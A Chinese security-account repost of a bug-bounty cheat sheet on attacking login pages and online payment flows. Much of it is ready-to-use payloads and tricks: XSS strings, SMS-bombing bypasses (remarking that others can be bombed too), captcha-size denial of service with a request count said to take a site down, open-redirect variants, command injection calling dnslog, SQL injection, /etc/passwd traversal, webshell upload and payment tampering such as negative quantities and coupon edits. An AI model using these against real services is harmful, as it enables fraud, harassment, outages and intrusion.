#  src-歪门邪道分享+支付漏洞挖掘   
1581495545157366  Z2O安全攻防   2024-05-29 20:49  
  
点击上方[蓝字]，关注我们  
  
  
**建议大家把公众号“Z2O安全攻防”设为星标，否则可能就看不到啦！**  
因为公众号现在只对常读和星标的公众号才能展示大图推送。操作方法：点击右上角的【...】，然后点击【设为星标】即可。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuao3T9EnGbUIqxgDhEVicCV8NbH4FiaZ3YIbpXNEr6qFicGkAelnQHKGHsVlfapMGgO3DHA68iaiac0n4Q/640?wx_fmt=png "")  
  
  
# 免责声明  
  
  
本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者及本公众号团队不为此承担任何责任。  
  
# 文章正文  
  
  
### 登陆口界面能做的操作  
  
短信轰炸、任意注册、验证码(登陆/注册//找回)/密码爆破、验证码相关、nday、弱口令、ddos、注入、枚举、越权、二维码劫持、js、url、返回包、信息泄露、rce、xss、sql注入  
### 弱口令  
  
标准的某某系统后台，而且暴露出用户手册第一：就是弱口令操作：admin/admin admin/123456 admin/admin888这样的，最好的方法就是自己积累一个常用字典，当然还可以去全网寻找这一套模板的管理员手册，最后就是github也去寻找一下，都没有的话，那就放弃这个方法第二：自然就是top10:万能密码(sql)、xss漏洞等的测试第三：逻辑漏洞分析首先还是先使用12查看页面源码，说不定管理员密码写在页面中的！然后可以注意到功能点是密码重置点，修改登录的返回包，对接口未授权查找这些  
### 登录框xss  
  
登录框输入特殊字符如 `` (` 等符号，页面出现errcode，从前端js可以翻到errcode值被传入前端源码中  
  
?errcode=123;confirm(1)//?errcode=123;prompt(1)//?errcode=123;alert(1)//?url=javascript:alert'1'  
### 短信轰炸  
  
Payload就是在手机号后面加 “，” + “数字”例如：1,2,3,4一次类推要是有限制 就绕过 如在手机号码前加空格之类或者修改xff头为127.0.0.1 删除cookie  
### 短信轰炸编码  
  
比如我的号码是18888888888我把18url编码为%31%38888888888就可以发送短信到我的手机号上面来按照这个思路我把188编码也是可以的、把1888编码也是可以的、把电话号第一位和电话号第三位编码也是可以的就可以无限制发送短信到我的手机号上，当然也可以轰炸别人  
### 短信号码加小数点  
  
phone=1888888888.0  
### & 绕过  
  
短信、邮箱轰炸"mobile":"18888888888"改为"mobile":"18888888888&&&&19999999999,每次多加一个&符号，就可以无限制发送"mobile":"18888888888"&19999999999  
### 双写绕过  
  
注册 密码找回 需要验证码时 两种方法  
### 绑定关系  
  
手机1的 验证码 手机2 使用mobi1e=13555555555,18888888&c0de=134567mobi1e=13555555555&mobile=18888888&code=134567mobile=xxx,&mobile=yyyy 加逗号可持续发送  
### 验证码常时效  
  
多个密码 一直用一个验证码  
### 图片验证码dos  
  
&height=1111&h=1111&size=1111&margin=1111 拼接到参数后尝试控制验证码大小验证码大小可控导致拒绝服务登录口的二维码登录也可尝试抓包得到URL后在得到了上面的链接地址之后呢我们进行如下修改：H=1000,W=1000分别设置为1000?w=10000&h=10000?width=1000&height=100hegiht=1111size=1111margin=1111  
  
怎么造成DDOS攻击？通过上面修改验证码大小的测试我们知道了漏洞存在，如果我们发送一个10000的数据包到服务器，服务器需要10s时间来处理，那么我们如果发送10个10000的数据包呢？10x10=100s也就是服务器需要花费100s时间去处理，当我们发送100个这样的数据包（当然你千万不要用100个数据包扔过去，一般来说经过测试结果20-50个就能导致网站瘫痪)  
### 图形验证码不失效  
  
漏洞描述：有些网站登录框存在图形验证码，防止暴力破解攻击，但是正常的逻辑是前端输入验证码之后进行校验图形验证码的正确性，而后若是为真则进行登录操作，为假则返回验证码输入错误，而使用一次的验证码应该立即失效。然而有些网站验证码可能是可控的，输入一些特殊字符可能就能打到欺骗服务器或验证码使用一次之后并没有及时刷新测试方法：输入用户名、密码、验证码后，点击登陆按钮同时将数据包使用burpsuite进行拦截，并使用Repeater模块或Intruder模块进行数据重放，重新发送五次观察页面变化，是否会提示验证码输入错误等信息  
### 验证码爆破  
  
6位数不好收 爆破一百个以上就行了超过五分钟以上还能登录 验证码依旧可以用爆破成功则尝试爆破其他手机号 若成功则是任意用户登录  
### 前台修改返回包  
  
Flase--true0-1fail-success500-200520-1 走一遍正确流程  
### url跳转  
  
https://www.xxx.com/redirect.php?url=.123.com （可能会跳转到123.com域名）https://www.xxx.com/redirect.php?url=/www.123.comhttps://www.xxx.com/redirect.php?url=///www.123.comhttps://www.xxx.com/redirect.php?url=//www.123.com@www.123.comhttps://www.xxx.com/redirect.php?url=/www.123.com?www.123.comhttps://www.xxx.com/redirect.php?url=/www.123.com#www.123.comhttps://www.xxx.com/redirect.php?url=/www.123.com\\www.123.com  
### fuzz漏洞  
  
username=test&userpass=123456&usertype=1注册用户时加隐藏字段usertype 设置为1 账户变成管理员  
### 奇葩绕过 找回密码  
  
用户名user1 手机号改为user2的 收到的验证码可以更改user1的密码  
### 用户接管  
  
用户a昵称已知 用户b 更改昵称a 先写为c 抓包改为a 放包 账号变成a 接管a  
### 企业注册  
  
使用当前公司的企业名称 统一信用代码注册 可能有注册覆盖 登录后直接得到内部信息  
### 企业注册上传webshell  
  
企业注册的地方有的需上传营业许可证之类的，这时可尝试上传webshell，若上传失败可尝试并发上传  
### 登录框RCE  
  
admin;whoamiusername=admin;whoami.dnslog.com&password=123456  
### sql注入  
  
大厂大部分函数都被过滤 所以采用延时1 and sleep(1) --+ 数字型1' and sleep(1) and ' 字符型and如果被过滤 替换 &&1 && 1 like sleep/**/(1)MSBhbmQgc2xIZXAoMSk= 延时1秒 base64  
### ssrf利用  
  
利用ssrf html导出功能场景 拿到指定文件内容请求包处修改请求报文  
```
<p><iframe src="http://tst.xxx.com/flag.html"></p>
```  
  
获取内网图片  
```
<img src="https://www.xxx.com/img/xxx.png">
```  
### 业务回退  
  
当优惠卷不能遍历并发的时候 尝试领取后浏览器返回上一级若能重新领取 则有漏洞用户修改密码成功 直接返回上一级变成修改密码 若别人能访问可尝试订单付款  
### 文件存在下载点  
  
尝试下载/读取其他文件../../ 没用时 可弄20来个../突破限制读取文件../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd  
### 常见id越权  
  
重点关注的点：收货地址 修改别人id 删除多余字段 下单改为别人的id 越权查看别人收货地址 若只有一个地址不可以越权删除用户编辑预览(草稿 回收站)报告(采购)订单(抽奖 付款)uid过长不好遍历则可设置为空后查看是否有隐藏参数  
### 子主账号  
  
登录管理员账号 抓包子账号，保留cookie,替换cookie,并且重放数据包，发现依旧能够获取到相同的数据即可证明子账号能够越权访问优惠套餐数据  
### 支付漏洞  
  
思考--怎么想到挖什么洞-一具体这个漏洞如何去挖怎么去分析思考的过程：核心：1、要便宜东西要到位：负数购买、小数点购买、优惠调整、直接修改下单金额、替换商品的参数、新人优惠并发、试用并发、type=3、free=1(不认识的参数如何思考：1、直接进行英文翻译fanyi.baidu.com 2、根据经验去看这个点)money=200&type=12、我只想买1天或者1小时：拆分购买，1周=7天=7*24小时=168小时需要168元但是你直接买1个小时仅需1元。3、打折这个问题是否有漏洞呢：根据页面提示做的思考4、一分钱不花东西拿走：实现方式：数量改成0、金额修改、支付类型修改生成订单这一步抓包，去修改  
  
可用余额：立即充值--首次充值--签约 并发 重放 修改数据包 四舍五入 溢出 小数点购买年限: 修改年限数字 拆分购买：count=:1year---count:=1day、count:=365-- count=1、count=aaa根据场景替换改反回包状态码 也可以这样尝试  
### 实际支付：  
  
交易密码：爆破交易密码 true--pwd=123555---pwd=true 修改返回包  
### 负数购买  
  
1、恶意锁库存：江2、修改数量、金币为负数3、修改uid为他人的越权花别人钱4、隐藏商品：更改商品id购买会员购买一些虚拟服务或者一些实体商城  
### 正负叠加  
  
随便购买两件商品，商品为数量一正一负提交订单  
### 优惠卷  
  
修改优惠券金额，把20改成130，然后记得计算好couponMenoy(优惠卷)参数值，140-l30-10,把里面的参数都修改好  
### 重复支付  
  
1、商品试用，重放数据包即可多次试用商品2、首单优惠，无限重购其他漏洞结合1、并发结合比如：并发领取优惠券、并发下单、并发提现等2、越权支付  
### 前端越权支付  
  
列：付费简历在免费简历模板点击浏览器检查--选择--框选预览--我的简历模块 将对应的html--编辑html 整块复制然后替换到付费模块 直接绕过付款界面 可以进行下载预览  
  
```
文章来源：https://xz.aliyun.com/t/14251
如有侵权，联系删除
```  
  
  
  
### 考证咨询  
  
  
最优惠报考  
各类安全证书(NISP/CISP/CISSP/PTE/PTS/PMP/IRE等....)，后台回复"  
好友位"咨询。  
  
  
### hvv招募  
  
  
厂商直推，大量初中高级需求，扫码投递简历  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuZ3bSnXfdDnF8ePdwj8LO6eDY9ibxxTQhdAK7DkVC9GTKY4BgFExTW3GXrSt7ksb5S8YS41LgtpaUg/640?wx_fmt=png&from=appmsg "")  
  
  
# 技术交流  
  
  
### 知识星球  
  
  
**欢迎加入知识星球****，星球致力于红蓝对抗，实战攻防，星球不定时更新内外网攻防渗透技巧，以及最新学习研究成果等。常态化更新最新安全动态。针对网络安全成员的普遍水平，为星友提供了教程、工具、POC&EXP以及各种学习笔记等等。**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYl1eHu25UAxhOZEBXZpSmXPg6kVsggaWKZsh0ab2kh6icbbkBgOH8icuV0x2IPGGRMiaU2hNBErstcA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYl1eHu25UAxhOZEBXZpSmX8Pjria4EK9ib8PPUAxiaMaSqUZibdxNoqqmmVHqGwXkYdzziaZNDLOwCGQw/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKubkRgdNbBQdOZibtbt7oibUpdUIl55vlmiaibqInxXG1Z9tfo52jF8onER5R4U2mCM5RpZia6rwEHnlMAg/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYItiapGtLIq3gAQYGfE5nictnkFeBicm7brKdibz4Va1hRf2dKZT0IyRRXYboE1lbZ6ZquDGnzqKibGGw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuZ9O4iae49hDfCW7hmqiaYclN40C2z9UJv97CT3smBsOVo7QMzxMGoGRg5WlUuP8QJ5AYjibbApqO5Zw/640?wx_fmt=png&from=appmsg "")  
  
  
### 交流群  
  
  
关注公众号回复“**加群**”，添加Z2OBot好友，自动拉你加入**Z2O安全攻防交流群(微信群)**分享更多好东西。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuYMO5aHRB3TbIy3xezlTAkbFzqIRfZNnicxSC23h1UmemDu9Jq38xrleA6NyoWBu1nAj0nmE6YXEHg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
### 关注我们  
  
  
  
**关注福利：**  
  
**回复“**  
**app****" 获取  app渗透和app抓包教程**  
  
**回复“**  
**渗透字典****" 获取 针对一些字典重新划分处理，收集了几个密码管理字典生成器用来扩展更多字典的仓库。**  
  
**回复“漏洞库" 获取 最新漏洞POC库(**  
**1.2W+****)******  
  
**回复“资料" 获取 网络安全、渗透测试相关资料文档**  
  
****  
点个【 在看 】，你最好看  
  
  
